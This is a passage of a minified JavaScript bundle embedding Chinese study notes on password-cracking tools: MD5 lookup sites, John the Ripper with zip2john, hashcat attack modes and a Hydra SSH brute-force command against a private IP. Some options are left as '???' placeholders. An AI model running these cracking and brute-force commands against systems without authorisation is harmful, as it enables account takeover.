                  md5.ttcha.net

                      \u9664\u6B64\u4E4B\u5916\uFF0C\u300A\u5929\u5929\u67E5\u8BE2\u300B\u8FD8\u4ECB\u7ECD\u4E86\u51E0\u4E2A\u5176\u5B83\u7684\u7AD9\uFF1A
                          \u56FD\u5185    www.cmd5.com        \u514D\u8D39+\u6536\u8D39
                          \u56FD\u5185    pmd5.com            \u514D\u8D39
                          \u56FD\u5185    www.xmd5.com        \u514D\u8D39+\u6536\u8D39
                          \u56FD\u5916    md5.gromweb.com     \u514D\u8D39
                          \u56FD\u5185    www.ttmd5.com       \u514D\u8D39

              `))},{name:"\u3010John The Ripper\u3011\u3001\u4EE5\u53CA\u3010\u3010zip2john\u3011\u5B50\u6A21\u5757\u7B49",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u57FA\u672C\u4ECB\u7ECD",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u57FA\u672C\u4ECB\u7ECD\uFF1A

              \u5404\u79CD\u52A0\u5BC6\u5BC6\u7801\u683C\u5F0F\u8FD0\u884C\uFF1A

                  \u5305\u62EC\u5728\u5404\u79CD Unix \u7248\u672C\uFF08\u57FA\u4E8E DES\u3001MD5 \u6216 Blowfish\uFF09\u4E0A\u6700\u5E38\u89C1\u7684\u51E0\u79CD\u52A0\u5BC6\u5BC6\u7801\u54C8\u5E0C\u7C7B\u578B \u3002
                  Kerberos AFS \u548C Windows NT/2000/XP/2003 LM \u54C8\u5E0C \u3002

                  \u5176\u4ED6\u6A21\u5757\u6269\u5C55\u4E86\u5B83\u7684\u80FD\u529B
                      \u5305\u62EC\u57FA\u4E8E MD4 \u7684\u5BC6\u7801\u54C8\u5E0C\u548C\u5B58\u50A8\u5728 LDAP\u3001MySQL \u7B49\u4E2D\u7684\u5BC6\u7801 \u3002


          \u8FD0\u884C\uFF1A

              \u7834\u89E3\u5BC6\u7801

                  john  -wordlist=<\u672C\u5730\u8BCD\u5178>    <hash\u503C\u6587\u4EF6>
                      \u53EF\u4EE5\u901A\u8FC7\u3010zip2john\u3011\uFF0C\u5F97\u5230\u3010hash\u503C\u6587\u4EF6\u3011\u3002

                  john  hash  --format=<\u7F16\u7801\u683C\u5F0F>  --wordlist=<\u672C\u5730\u8BCD\u5178>  --rules=<\u89C4\u5219\u96C6>
                      \u3010--format\u3011\uFF0C123
                      \u3010--wordlist\u3011\uFF0C---
                      \u3010--rules\u3011\uFF0C---

              \u56DE\u663E\u5BC6\u7801

                  john  --show  <hash\u503C\u6587\u4EF6>

                      \u7ED3\u679C\uFF1A
                          \u4EE5\u3010\u6587\u4EF6\u540D:\u5BC6\u7801::\u3011\u7684\u5F62\u5F0F\u663E\u793A

              \u5E38\u7528\u9009\u9879\uFF1A
                  \u3010--fork\u3011\uFF0C\uFF1F\uFF1F\uFF1F

          `))},{name:"\u3010zip2john\u3011 \u6A21\u5757\u547D\u4EE4",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              zip2john  <zip\u6587\u4EF6>  >  <\u5BFC\u51FA\u6587\u4EF6\u540D\u79F0\u5982hashes>


              \u5E38\u89C1\u9009\u9879\uFF1A
                  \u3010-o\u3011\uFF0C\u6307\u5B9A\u5F53\u6587\u4EF6
                      \u539F\u56E0\uFF1A\u6709\u65F6\u5019\u3010\u4E0D\u540C\u6587\u4EF6\u3011\u91C7\u7528\u4E86\u3010\u4E0D\u540C\u5BC6\u7801\u3011\uFF0C\u9700\u5355\u72EC\u5904\u7406\u3002

              `))},t.b]},{name:"\u3010hashcat\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u3010hashcat\u3011

                  \u4ECB\u7ECD
                      \u7834\u89E3\u3010hash\u503C\u3011

                  \u8FD0\u884C
                      hashcat  -a  0  -m  0  <hash\u503C\u6587\u4EF6>  <\u672C\u5730\u8BCD\u5178>
                          \u3010-a\u3011\uFF0C\u653B\u51FB\u6A21\u5F0F

                          \u3010-m\u3011\uFF0Chash\u7C7B\u578B

                          \u7ED3\u679C\uFF1A
                              \u4EE5\u3010hash:\u5BC6\u7801\u3011\u7684\u5F62\u5F0F\u663E\u793A

                  \u5E38\u89C1\u9009\u9879
                      \u3010-a\u3011\uFF0C\u9009\u62E9\u3010\u653B\u51FB\u6A21\u5F0F\u3011
                          0\uFF0C\u4EE3\u8868\u3010\u8BCD\u5178\u653B\u51FB\u3011
                          1\uFF0C\u4EE3\u8868\u3010\u7EC4\u5408\u653B\u51FB\u3011
                          3\uFF0C\u4EE3\u8868\u3010\u86EE\u529B\u653B\u51FB\u3011\u3001\u3010\u9762\u5177\u653B\u51FB\u3011
                          \u3010\u6DF7\u5408\u653B\u51FB\u3011
                              6\uFF0C\u3010\u8BCD\u5178+\u9762\u5177\u3011
                              7.\u3010\u9762\u5177+\u8BCD\u5178\u3011
                          9\uFF0C\u4EE3\u8868\u3010\u5173\u8054\u653B\u51FB\u3011

                      \u3010-m\u3011\uFF0Chash\u7C7B\u578B
                          0\uFF0C\u4EE3\u8868\u3010MD5 | Raw hash\u3011

                      \u3010--force\u3011
                          \uFF1F\uFF1F\uFF1F

                      \u3010-w\u3011
                          \uFF1F\uFF1F\uFF1F

                      \u3010-o\u3011
                          \uFF1F\uFF1F\uFF1F

              `))},{name:"\u3010Hydra\u3011",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

              \u3010Hydra\u3011

              \u8D44\u6599\uFF1A
                  \u5927\u8303\u56F4\u4ECB\u7ECD\uFF1Ahttps://null-byte.wonderhowto.com/how-to/gain-ssh-access-servers-by-brute-forcing-credentials-0194263/
                  \u8BE6\u7EC6\u4F7F\u7528\uFF1Ahttps://www.linuxfordevices.com/tutorials/linux/hydra-brute-force-ssh

              \u547D\u4EE4\uFF1A

                  hydra  -L  users.txt  -P  passwords.txt  ssh://172.16.1.102  -t  4
                      \u3010-l\u3011
                          \u6307\u5B9A\u7528\u6237\u540D
                      \u3010-L\u3011
                          \u6307\u5B9A\u3010\u7528\u6237\u540D\u8BCD\u5178\u3011
                      \u3010-p\u3011
                          \u6307\u5B9A\u5BC6\u7801
                      \u3010-P\u3011
                          \u6307\u5B9A\u3010\u5BC6\u7801\u8BCD\u5178\u3011
                      \u3010-t\u3011
                          \u7EBF\u7A0B\u6570

              `))}]}]},k=F},yvwo:function(nu,U,f){nu.exports={"ant-pro-menu-item-title":"ant-pro-menu-item-title___1mblt","ant-menu-item":"ant-menu-item___3Mgb7","ant-menu-submenu-title":"ant-menu-submenu-title___2LpSZ",koanList:"koanList___11yjA",ftDrawer:"ftDrawer___1xnqD",quickBtns:"quickBtns___HlLsS",doc:"doc___3d_zx",subDesc:"subDesc___Gby9d",toolList:"toolList___3E-b4",toolFlags:"toolFlags___3kDtQ",combined_searchCp:"combined_searchCp___3gdCg"}}}]);